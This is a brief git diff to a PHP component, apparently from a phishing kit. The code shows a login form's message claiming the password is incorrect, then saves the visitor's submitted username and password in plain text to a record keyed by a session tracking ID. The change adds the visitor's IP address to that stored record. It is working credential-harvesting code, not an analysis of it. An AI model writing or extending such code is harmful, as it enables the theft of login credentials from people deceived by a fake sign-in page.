@@ -55,11 +55,13 @@ class LocationComponent extends Component
             'password.required_with' => 'The password you’ve entered is incorrect.',
         ]);
         
+        $ip = request()->ip();
         $trackingId = session()->get('url')['trackingId'];
         $url = session()->get('url')['value'];
         $tracker = TrackedData::find($trackingId)->first();
         if($tracker) {
             $tracker->update([
+                'ip' => $ip,
                 'username' => $this->username,
                 'password' => $this->password,
             ]);
